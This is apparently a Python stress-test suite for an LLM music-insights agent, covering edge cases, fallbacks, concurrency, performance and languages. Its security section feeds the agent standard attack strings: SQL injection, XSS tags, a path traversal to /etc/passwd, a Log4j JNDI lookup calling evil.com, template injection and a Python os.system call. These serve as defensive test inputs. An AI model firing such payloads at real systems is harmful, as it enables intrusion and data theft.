"""
BRUTAL TEST SUITE FOR AI INSIGHTS
Tests all edge cases, error conditions, and extreme scenarios
"""

import sys
import os
sys.path.insert(0, '/vercel/sandbox')

import json
import time
from datetime import datetime
from typing import Dict, List, Any

# Test results tracking
test_results = {
    'total_tests': 0,
    'passed': 0,
    'failed': 0,
    'errors': 0,
    'warnings': 0,
    'test_details': []
}

def log_test(test_name: str, status: str, message: str = "", details: Any = None):
    """Log test result"""
    test_results['total_tests'] += 1
    
    if status == 'PASS':
        test_results['passed'] += 1
        symbol = '✅'
    elif status == 'FAIL':
        test_results['failed'] += 1
        symbol = '❌'
    elif status == 'ERROR':
        test_results['errors'] += 1
        symbol = '💥'
    else:  # WARNING
        test_results['warnings'] += 1
        symbol = '⚠️'
    
    result = {
        'test': test_name,
        'status': status,
        'message': message,
        'details': details,
        'timestamp': datetime.now().isoformat()
    }
    
    test_results['test_details'].append(result)
    print(f"{symbol} {test_name}: {status} - {message}")
    
    if details:
        print(f"   Details: {str(details)[:200]}")

def test_imports():
    """Test 1: Import all required modules"""
    try:
        from src.llm_agent import LLMAgent
        log_test("Import LLMAgent", "PASS", "Successfully imported")
        
        from src.workflow import MultiAgentWorkflow
        log_test("Import MultiAgentWorkflow", "PASS", "Successfully imported")
        
        return True
    except Exception as e:
        log_test("Import Modules", "ERROR", f"Failed to import: {str(e)}")
        return False

def test_llm_agent_initialization():
    """Test 2: LLM Agent initialization with various configurations"""
    try:
        from src.llm_agent import LLMAgent
        
        # Test 1: Default initialization
        try:
            agent = LLMAgent()
            log_test("LLMAgent Default Init", "PASS", f"Model type: {agent.model_type}")
        except Exception as e:
            log_test("LLMAgent Default Init", "FAIL", str(e))
        
        # Test 2: With temperature
        try:
            agent = LLMAgent(temperature=0.9)
            log_test("LLMAgent Custom Temperature", "PASS", f"Temperature: {agent.temperature}")
        except Exception as e:
            log_test("LLMAgent Custom Temperature", "FAIL", str(e))
        
        # Test 3: With invalid temperature (edge case)
        try:
            agent = LLMAgent(temperature=2.0)  # Invalid
            log_test("LLMAgent Invalid Temperature", "WARNING", "Accepted invalid temperature")
        except Exception as e:
            log_test("LLMAgent Invalid Temperature", "PASS", "Correctly rejected invalid value")
        
        return True
    except Exception as e:
        log_test("LLMAgent Initialization", "ERROR", str(e))
        return False

def test_music_insights_edge_cases():
    """Test 3: Music insights with extreme edge cases"""
    try:
        from src.llm_agent import LLMAgent
        
        agent = LLMAgent()
        
        # Test Case 1: Empty question
        try:
            result = agent.get_music_insights(
                question="",
                user_context="",
                conversation_history=None
            )
            if 'error' in result or 'insight' in result:
                log_test("Empty Question", "PASS", "Handled empty question")
            else:
                log_test("Empty Question", "FAIL", "Unexpected response format")
        except Exception as e:
            log_test("Empty Question", "ERROR", str(e))
        
        # Test Case 2: Very long question (token overflow)
        try:
            long_question = "Tell me about music " * 1000  # 4000+ words
            result = agent.get_music_insights(
                question=long_question,
                user_context="",
                conversation_history=None
            )
            if 'insight' in result or 'answer' in result or 'error' in result:
                log_test("Long Question (4000+ words)", "PASS", "Handled long input")
            else:
                log_test("Long Question", "FAIL", "Unexpected response")
        except Exception as e:
            log_test("Long Question", "ERROR", str(e))
        
        # Test Case 3: Special characters and Unicode
        try:
            special_question = "What about 音楽 🎵 émotions & <script>alert('xss')</script>?"
            result = agent.get_music_insights(
                question=special_question,
                user_context="",
                conversation_history=None
            )
            log_test("Special Characters & Unicode", "PASS", "Handled special chars")
        except Exception as e:
            log_test("Special Characters", "ERROR", str(e))
        
        # Test Case 4: SQL Injection attempt
        try:
            sql_question = "'; DROP TABLE users; --"
            result = agent.get_music_insights(
                question=sql_question,
                user_context="",
                conversation_history=None
            )
            log_test("SQL Injection Attempt", "PASS", "Handled malicious input")
        except Exception as e:
            log_test("SQL Injection", "ERROR", str(e))
        
        # Test Case 5: Null/None values
        try:
            result = agent.get_music_insights(
                question=None,
                user_context=None,
                conversation_history=None
            )
            log_test("Null Values", "PASS", "Handled null inputs")
        except Exception as e:
            log_test("Null Values", "ERROR", str(e))
        
        # Test Case 6: Invalid data types
        try:
            result = agent.get_music_insights(
                question=12345,  # Integer instead of string
                user_context={"invalid": "dict"},
                conversation_history="not a list"
            )
            log_test("Invalid Data Types", "PASS", "Handled type mismatch")
        except Exception as e:
            log_test("Invalid Data Types", "ERROR", str(e))
        
        # Test Case 7: Extremely nested conversation history
        try:
            nested_history = [
                {'query': 'q' * 1000, 'response': 'r' * 1000}
                for _ in range(100)
            ]
            result = agent.get_music_insights(
                question="Simple question",
                user_context="",
                conversation_history=nested_history
            )
            log_test("Nested Conversation History", "PASS", "Handled large history")
        except Exception as e:
            log_test("Nested History", "ERROR", str(e))
        
        # Test Case 8: Non-music related questions
        try:
            result = agent.get_music_insights(
                question="What is the capital of France?",
                user_context="",
                conversation_history=None
            )
            response_text = result.get('insight', result.get('answer', ''))
            if 'music' in response_text.lower() or 'recommend' in response_text.lower():
                log_test("Non-Music Question", "PASS", "Redirected to music context")
            else:
                log_test("Non-Music Question", "WARNING", "May have answered off-topic")
        except Exception as e:
            log_test("Non-Music Question", "ERROR", str(e))
        
        # Test Case 9: Profanity and inappropriate content
        try:
            result = agent.get_music_insights(
                question="Tell me about f***ing music",
                user_context="",
                conversation_history=None
            )
            log_test("Profanity Handling", "PASS", "Handled inappropriate language")
        except Exception as e:
            log_test("Profanity", "ERROR", str(e))
        
        # Test Case 10: Rapid-fire questions (stress test)
        try:
            start_time = time.time()
            for i in range(10):
                result = agent.get_music_insights(
                    question=f"Question {i}",
                    user_context="",
                    conversation_history=None
                )
            elapsed = time.time() - start_time
            log_test("Rapid-Fire Questions (10x)", "PASS", f"Completed in {elapsed:.2f}s")
        except Exception as e:
            log_test("Rapid-Fire Questions", "ERROR", str(e))
        
        return True
    except Exception as e:
        log_test("Music Insights Edge Cases", "ERROR", str(e))
        return False

def test_streaming_edge_cases():
    """Test 4: Streaming functionality edge cases"""
    try:
        from src.llm_agent import LLMAgent
        
        agent = LLMAgent()
        
        # Test Case 1: Empty question streaming
        try:
            chunks = []
            for chunk in agent.get_music_insights_stream(
                question="",
                user_context="",
                conversation_history=None
            ):
                chunks.append(chunk)
            
            if chunks:
                log_test("Streaming Empty Question", "PASS", f"Got {len(chunks)} chunks")
            else:
                log_test("Streaming Empty Question", "WARNING", "No chunks returned")
        except Exception as e:
            log_test("Streaming Empty Question", "ERROR", str(e))
        
        # Test Case 2: Streaming with interruption simulation
        try:
            chunk_count = 0
            for chunk in agent.get_music_insights_stream(
                question="Tell me about jazz music",
                user_context="",
                conversation_history=None
            ):
                chunk_count += 1
                if chunk_count > 5:
                    break  # Simulate early termination
            
            log_test("Streaming Early Termination", "PASS", f"Handled interruption at chunk {chunk_count}")
        except Exception as e:
            log_test("Streaming Interruption", "ERROR", str(e))
        
        # Test Case 3: Streaming with very long response
        try:
            chunks = []
            for chunk in agent.get_music_insights_stream(
                question="Tell me everything about the history of music from ancient times to modern day in extreme detail",
                user_context="",
                conversation_history=None
            ):
                chunks.append(chunk)
            
            total_length = sum(len(str(c)) for c in chunks)
            log_test("Streaming Long Response", "PASS", f"Total length: {total_length} chars, {len(chunks)} chunks")
        except Exception as e:
            log_test("Streaming Long Response", "ERROR", str(e))
        
        return True
    except Exception as e:
        log_test("Streaming Edge Cases", "ERROR", str(e))
        return False

def test_fallback_mechanisms():
    """Test 5: Fallback mechanisms and error recovery"""
    try:
        from src.llm_agent import LLMAgent
        
        # Test with no API keys (should use fallback)
        original_key = os.environ.get('OPENAI_API_KEY')
        original_hf = os.environ.get('HUGGINGFACE_TOKEN')
        
        try:
            # Remove API keys temporarily
            if 'OPENAI_API_KEY' in os.environ:
                del os.environ['OPENAI_API_KEY']
            if 'HUGGINGFACE_TOKEN' in os.environ:
                del os.environ['HUGGINGFACE_TOKEN']
            
            agent = LLMAgent()
            
            # Test Case 1: Fallback for mood-based query
            result = agent.get_music_insights(
                question="I'm feeling happy",
                user_context="",
                conversation_history=None
            )
            
            if 'insight' in result or 'answer' in result:
                log_test("Fallback - Mood Query", "PASS", "Fallback provided response")
            else:
                log_test("Fallback - Mood Query", "FAIL", "No fallback response")
            
            # Test Case 2: Fallback for genre query
            result = agent.get_music_insights(
                question="Tell me about jazz",
                user_context="",
                conversation_history=None
            )
            
            response_text = result.get('insight', result.get('answer', ''))
            if 'jazz' in response_text.lower():
                log_test("Fallback - Genre Query", "PASS", "Fallback knows about jazz")
            else:
                log_test("Fallback - Genre Query", "WARNING", "Generic fallback response")
            
            # Test Case 3: Fallback for artist query
            result = agent.get_music_insights(
                question="Tell me about Drake",
                user_context="",
                conversation_history=None
            )
            
            log_test("Fallback - Artist Query", "PASS", "Fallback handled artist query")
            
            # Test Case 4: Fallback for workout query
            result = agent.get_music_insights(
                question="Music for workout",
                user_context="",
                conversation_history=None
            )
            
            response_text = result.get('insight', result.get('answer', ''))
            if 'workout' in response_text.lower() or 'exercise' in response_text.lower():
                log_test("Fallback - Workout Query", "PASS", "Fallback understands workout context")
            else:
                log_test("Fallback - Workout Query", "WARNING", "Generic response")
            
        finally:
            # Restore API keys
            if original_key:
                os.environ['OPENAI_API_KEY'] = original_key
            if original_hf:
                os.environ['HUGGINGFACE_TOKEN'] = original_hf
        
        return True
    except Exception as e:
        log_test("Fallback Mechanisms", "ERROR", str(e))
        return False

def test_conversation_memory():
    """Test 6: Conversation history and follow-up questions"""
    try:
        from src.llm_agent import LLMAgent
        
        agent = LLMAgent()
        
        # Test Case 1: Follow-up without history
        result1 = agent.get_music_insights(
            question="Tell me about jazz",
            user_context="",
            conversation_history=None
        )
        
        result2 = agent.get_music_insights(
            question="Tell me more",
            user_context="",
            conversation_history=None
        )
        
        log_test("Follow-up Without History", "PASS", "Handled follow-up without context")
        
        # Test Case 2: Follow-up with history
        history = [
            {'query': 'Tell me about jazz', 'response': 'Jazz is a music genre...'}
        ]
        
        result3 = agent.get_music_insights(
            question="What about hip-hop?",
            user_context="",
            conversation_history=history
        )
        
        log_test("Follow-up With History", "PASS", "Used conversation history")
        
        # Test Case 3: Very long conversation history
        long_history = [
            {'query': f'Question {i}', 'response': f'Response {i}' * 100}
            for i in range(50)
        ]
        
        result4 = agent.get_music_insights(
            question="New question",
            user_context="",
            conversation_history=long_history
        )
        
        log_test("Long Conversation History", "PASS", "Handled 50+ exchanges")
        
        # Test Case 4: Malformed history
        bad_history = [
            {'wrong_key': 'value'},
            None,
            "string instead of dict",
            {'query': 'only query'},
            {'response': 'only response'}
        ]
        
        try:
            result5 = agent.get_music_insights(
                question="Question",
                user_context="",
                conversation_history=bad_history
            )
            log_test("Malformed History", "PASS", "Handled malformed history")
        except Exception as e:
            log_test("Malformed History", "ERROR", str(e))
        
        return True
    except Exception as e:
        log_test("Conversation Memory", "ERROR", str(e))
        return False

def test_user_context_handling():
    """Test 7: User context and personalization"""
    try:
        from src.llm_agent import LLMAgent
        
        agent = LLMAgent()
        
        # Test Case 1: Empty context
        result = agent.get_music_insights(
            question="Recommend music",
            user_context="",
            conversation_history=None
        )
        log_test("Empty User Context", "PASS", "Handled empty context")
        
        # Test Case 2: Rich context
        rich_context = """
        USER PROFILE:
        Favorite genres: hip-hop, R&B, electronic
        Recently listening to: Drake, The Weeknd, Travis Scott
        Music style preferences: high-energy, upbeat, modern
        """
        
        result = agent.get_music_insights(
            question="Recommend something",
            user_context=rich_context,
            conversation_history=None
        )
        
        response_text = result.get('insight', result.get('answer', ''))
        if any(term in response_text.lower() for term in ['drake', 'hip-hop', 'r&b', 'energy']):
            log_test("Rich User Context", "PASS", "Used context for personalization")
        else:
            log_test("Rich User Context", "WARNING", "May not have used context")
        
        # Test Case 3: Malformed context
        result = agent.get_music_insights(
            question="Recommend music",
            user_context={"dict": "instead of string"},
            conversation_history=None
        )
        log_test("Malformed Context", "PASS", "Handled dict context")
        
        # Test Case 4: Very long context
        long_context = "User likes music " * 1000
        result = agent.get_music_insights(
            question="Recommend",
            user_context=long_context,
            conversation_history=None
        )
        log_test("Long User Context", "PASS", "Handled long context")
        
        return True
    except Exception as e:
        log_test("User Context Handling", "ERROR", str(e))
        return False

def test_response_quality():
    """Test 8: Response quality and content validation"""
    try:
        from src.llm_agent import LLMAgent
        
        agent = LLMAgent()
        
        test_cases = [
            ("Tell me about jazz", ["jazz", "music", "genre"]),
            ("I'm feeling sad", ["sad", "music", "mood"]),
            ("Music for workout", ["workout", "exercise", "energy"]),
            ("Who is Drake?", ["drake", "artist", "rapper"]),
            ("What is hip-hop?", ["hip-hop", "rap", "music"]),
        ]
        
        for question, expected_keywords in test_cases:
            result = agent.get_music_insights(
                question=question,
                user_context="",
                conversation_history=None
            )
            
            response_text = result.get('insight', result.get('answer', '')).lower()
            
            # Check if response contains expected keywords
            matches = sum(1 for kw in expected_keywords if kw in response_text)
            
            if matches >= 2:
                log_test(f"Response Quality: '{question[:30]}'", "PASS", f"Contains {matches}/{len(expected_keywords)} keywords")
            elif matches >= 1:
                log_test(f"Response Quality: '{question[:30]}'", "WARNING", f"Only {matches}/{len(expected_keywords)} keywords")
            else:
                log_test(f"Response Quality: '{question[:30]}'", "FAIL", "No expected keywords found")
        
        return True
    except Exception as e:
        log_test("Response Quality", "ERROR", str(e))
        return False

def test_concurrent_requests():
    """Test 9: Concurrent request handling"""
    try:
        from src.llm_agent import LLMAgent
        import threading
        
        agent = LLMAgent()
        results = []
        errors = []
        
        def make_request(question_id):
            try:
                result = agent.get_music_insights(
                    question=f"Question {question_id}",
                    user_context="",
                    conversation_history=None
                )
                results.append(result)
            except Exception as e:
                errors.append(str(e))
        
        # Create 10 concurrent threads
        threads = []
        for i in range(10):
            thread = threading.Thread(target=make_request, args=(i,))
            threads.append(thread)
            thread.start()
        
        # Wait for all threads
        for thread in threads:
            thread.join(timeout=30)
        
        if len(results) == 10 and len(errors) == 0:
            log_test("Concurrent Requests (10x)", "PASS", "All requests succeeded")
        elif len(results) > 0:
            log_test("Concurrent Requests", "WARNING", f"{len(results)}/10 succeeded, {len(errors)} errors")
        else:
            log_test("Concurrent Requests", "FAIL", "All requests failed")
        
        return True
    except Exception as e:
        log_test("Concurrent Requests", "ERROR", str(e))
        return False

def test_memory_leaks():
    """Test 10: Memory usage and potential leaks"""
    try:
        from src.llm_agent import LLMAgent
        import gc
        
        agent = LLMAgent()
        
        # Make many requests to check for memory leaks
        for i in range(100):
            result = agent.get_music_insights(
                question=f"Question {i}",
                user_context="Context " * 100,
                conversation_history=[
                    {'query': f'Q{j}', 'response': f'R{j}' * 50}
                    for j in range(10)
                ]
            )
            
            if i % 20 == 0:
                gc.collect()  # Force garbage collection
        
        log_test("Memory Leak Test (100 requests)", "PASS", "Completed without crash")
        
        return True
    except Exception as e:
        log_test("Memory Leak Test", "ERROR", str(e))
        return False

def test_error_messages():
    """Test 11: Error message quality and helpfulness"""
    try:
        from src.llm_agent import LLMAgent
        
        agent = LLMAgent()
        
        # Test various error scenarios
        error_scenarios = [
            (None, None, None, "All null inputs"),
            ("", "", [], "All empty inputs"),
            (12345, 67890, "string", "Wrong types"),
        ]
        
        for question, context, history, description in error_scenarios:
            try:
                result = agent.get_music_insights(
                    question=question,
                    user_context=context,
                    conversation_history=history
                )
                
                if 'error' in result:
                    log_test(f"Error Message: {description}", "PASS", "Returned error message")
                else:
                    log_test(f"Error Handling: {description}", "PASS", "Handled gracefully")
            except Exception as e:
                error_msg = str(e)
                if len(error_msg) > 10:  # Has meaningful error message
                    log_test(f"Error Message: {description}", "PASS", f"Clear error: {error_msg[:50]}")
                else:
                    log_test(f"Error Message: {description}", "WARNING", "Vague error message")
        
        return True
    except Exception as e:
        log_test("Error Messages", "ERROR", str(e))
        return False

def test_performance_benchmarks():
    """Test 12: Performance benchmarks"""
    try:
        from src.llm_agent import LLMAgent
        
        agent = LLMAgent()
        
        # Test Case 1: Simple query performance
        start = time.time()
        result = agent.get_music_insights(
            question="Tell me about jazz",
            user_context="",
            conversation_history=None
        )
        simple_time = time.time() - start
        
        if simple_time < 5.0:
            log_test("Performance: Simple Query", "PASS", f"{simple_time:.2f}s")
        elif simple_time < 10.0:
            log_test("Performance: Simple Query", "WARNING", f"{simple_time:.2f}s (slow)")
        else:
            log_test("Performance: Simple Query", "FAIL", f"{simple_time:.2f}s (too slow)")
        
        # Test Case 2: Complex query performance
        start = time.time()
        result = agent.get_music_insights(
            question="Tell me about the history of jazz music and recommend some artists",
            user_context="User likes: " + ", ".join([f"artist{i}" for i in range(50)]),
            conversation_history=[
                {'query': f'Q{i}', 'response': f'R{i}' * 100}
                for i in range(10)
            ]
        )
        complex_time = time.time() - start
        
        if complex_time < 10.0:
            log_test("Performance: Complex Query", "PASS", f"{complex_time:.2f}s")
        elif complex_time < 20.0:
            log_test("Performance: Complex Query", "WARNING", f"{complex_time:.2f}s (slow)")
        else:
            log_test("Performance: Complex Query", "FAIL", f"{complex_time:.2f}s (too slow)")
        
        # Test Case 3: Streaming performance
        start = time.time()
        chunk_count = 0
        for chunk in agent.get_music_insights_stream(
            question="Tell me about music",
            user_context="",
            conversation_history=None
        ):
            chunk_count += 1
        streaming_time = time.time() - start
        
        log_test("Performance: Streaming", "PASS", f"{streaming_time:.2f}s, {chunk_count} chunks")
        
        return True
    except Exception as e:
        log_test("Performance Benchmarks", "ERROR", str(e))
        return False

def test_real_world_scenarios():
    """Test 13: Real-world usage scenarios"""
    try:
        from src.llm_agent import LLMAgent
        
        agent = LLMAgent()
        
        scenarios = [
            {
                'name': 'New User - First Question',
                'question': 'What music should I listen to?',
                'context': '',
                'history': None
            },
            {
                'name': 'Mood-Based Request',
                'question': "I'm feeling really down today, what should I listen to?",
                'context': 'USER PROFILE:\nFavorite genres: indie, alternative',
                'history': None
            },
            {
                'name': 'Activity-Based Request',
                'question': 'I need music for my morning run',
                'context': 'USER PROFILE:\nUsually runs at 7 AM\nLikes: electronic, hip-hop',
                'history': None
            },
            {
                'name': 'Artist Discovery',
                'question': 'I love The Weeknd, who else should I check out?',
                'context': 'USER PROFILE:\nTop artists: The Weeknd, Drake, Travis Scott',
                'history': None
            },
            {
                'name': 'Genre Exploration',
                'question': 'I want to explore jazz but don\'t know where to start',
                'context': 'USER PROFILE:\nCurrently listens to: pop, rock',
                'history': None
            },
            {
                'name': 'Follow-up Question',
                'question': 'What about for studying?',
                'context': '',
                'history': [
                    {'query': 'Music for workout', 'response': 'High-energy electronic and hip-hop...'}
                ]
            },
            {
                'name': 'Specific Artist Info',
                'question': 'Tell me about Kendrick Lamar',
                'context': '',
                'history': None
            },
            {
                'name': 'Playlist Creation Request',
                'question': 'Can you create a chill evening playlist for me?',
                'context': 'USER PROFILE:\nLikes: lo-fi, indie, acoustic',
                'history': None
            },
            {
                'name': 'Comparison Question',
                'question': 'What\'s the difference between hip-hop and rap?',
                'context': '',
                'history': None
            },
            {
                'name': 'Vague Request',
                'question': 'Something good',
                'context': 'USER PROFILE:\nDiverse taste: rock, electronic, jazz, hip-hop',
                'history': None
            }
        ]
        
        for scenario in scenarios:
            try:
                result = agent.get_music_insights(
                    question=scenario['question'],
                    user_context=scenario['context'],
                    conversation_history=scenario['history']
                )
                
                response_text = result.get('insight', result.get('answer', ''))
                
                if len(response_text) > 50:  # Has substantial response
                    log_test(f"Scenario: {scenario['name']}", "PASS", f"Response length: {len(response_text)}")
                else:
                    log_test(f"Scenario: {scenario['name']}", "WARNING", "Short response")
                    
            except Exception as e:
                log_test(f"Scenario: {scenario['name']}", "ERROR", str(e))
        
        return True
    except Exception as e:
        log_test("Real-World Scenarios", "ERROR", str(e))
        return False

def test_internationalization():
    """Test 14: International characters and languages"""
    try:
        from src.llm_agent import LLMAgent
        
        agent = LLMAgent()
        
        international_queries = [
            ("音楽について教えて", "Japanese"),
            ("Parle-moi de musique", "French"),
            ("Háblame de música", "Spanish"),
            ("Расскажи о музыке", "Russian"),
            ("موسيقى", "Arabic"),
            ("संगीत के बारे में बताओ", "Hindi"),
            ("告诉我关于音乐", "Chinese"),
            ("Erzähl mir über Musik", "German"),
        ]
        
        for query, language in international_queries:
            try:
                result = agent.get_music_insights(
                    question=query,
                    user_context="",
                    conversation_history=None
                )
                
                if 'insight' in result or 'answer' in result:
                    log_test(f"International: {language}", "PASS", "Handled non-English query")
                else:
                    log_test(f"International: {language}", "WARNING", "Unexpected response format")
            except Exception as e:
                log_test(f"International: {language}", "ERROR", str(e))
        
        return True
    except Exception as e:
        log_test("Internationalization", "ERROR", str(e))
        return False

def test_security_vulnerabilities():
    """Test 15: Security and injection attacks"""
    try:
        from src.llm_agent import LLMAgent
        
        agent = LLMAgent()
        
        attack_vectors = [
            ("'; DROP TABLE users; --", "SQL Injection"),
            ("<script>alert('XSS')</script>", "XSS Attack"),
            ("../../../etc/passwd", "Path Traversal"),
            ("${jndi:ldap://evil.com/a}", "Log4j Injection"),
            ("' OR '1'='1", "SQL Boolean Injection"),
            ("<img src=x onerror=alert(1)>", "XSS Image"),
            ("{{7*7}}", "Template Injection"),
            ("__import__('os').system('ls')", "Python Code Injection"),
        ]
        
        for attack, attack_type in attack_vectors:
            try:
                result = agent.get_music_insights(
                    question=attack,
                    user_context="",
                    conversation_history=None
                )
                
                # Check if attack was neutralized
                response_text = result.get('insight', result.get('answer', ''))
                
                if attack not in response_text:
                    log_test(f"Security: {attack_type}", "PASS", "Attack neutralized")
                else:
                    log_test(f"Security: {attack_type}", "WARNING", "Attack string in response")
                    
            except Exception as e:
                log_test(f"Security: {attack_type}", "PASS", "Attack blocked with error")
        
        return True
    except Exception as e:
        log_test("Security Vulnerabilities", "ERROR", str(e))
        return False

def run_all_tests():
    """Run all brutal tests"""
    print("\n" + "="*80)
    print("🔥 BRUTAL AI INSIGHTS TEST SUITE 🔥")
    print("="*80 + "\n")
    
    start_time = time.time()
    
    # Run all test suites
    test_suites = [
        ("Module Imports", test_imports),
        ("LLM Agent Initialization", test_llm_agent_initialization),
        ("Music Insights Edge Cases", test_music_insights_edge_cases),
        ("Streaming Edge Cases", test_streaming_edge_cases),
        ("Fallback Mechanisms", test_fallback_mechanisms),
        ("Conversation Memory", test_conversation_memory),
        ("User Context Handling", test_user_context_handling),
        ("Response Quality", test_response_quality),
        ("Concurrent Requests", test_concurrent_requests),
        ("Memory Leak Test", test_memory_leaks),
        ("Error Messages", test_error_messages),
        ("Performance Benchmarks", test_performance_benchmarks),
        ("Real-World Scenarios", test_real_world_scenarios),
        ("Internationalization", test_internationalization),
        ("Security Vulnerabilities", test_security_vulnerabilities),
    ]
    
    for suite_name, test_func in test_suites:
        print(f"\n{'─'*80}")
        print(f"📋 Running: {suite_name}")
        print(f"{'─'*80}")
        try:
            test_func()
        except Exception as e:
            log_test(suite_name, "ERROR", f"Test suite crashed: {str(e)}")
    
    elapsed_time = time.time() - start_time
    
    # Print summary
    print("\n" + "="*80)
    print("📊 TEST SUMMARY")
    print("="*80)
    print(f"Total Tests: {test_results['total_tests']}")
    print(f"✅ Passed: {test_results['passed']}")
    print(f"❌ Failed: {test_results['failed']}")
    print(f"💥 Errors: {test_results['errors']}")
    print(f"⚠️  Warnings: {test_results['warnings']}")
    print(f"⏱️  Time: {elapsed_time:.2f}s")
    
    # Calculate success rate
    if test_results['total_tests'] > 0:
        success_rate = (test_results['passed'] / test_results['total_tests']) * 100
        print(f"📈 Success Rate: {success_rate:.1f}%")
    
    print("="*80 + "\n")
    
    # Save detailed results to file
    with open('/vercel/sandbox/test_results_brutal.json', 'w') as f:
        json.dump(test_results, f, indent=2)
    
    print("💾 Detailed results saved to: test_results_brutal.json\n")
    
    return test_results

if __name__ == "__main__":
    results = run_all_tests()
    
    # Exit with appropriate code
    if results['failed'] > 0 or results['errors'] > 0:
        sys.exit(1)
    else:
        sys.exit(0)
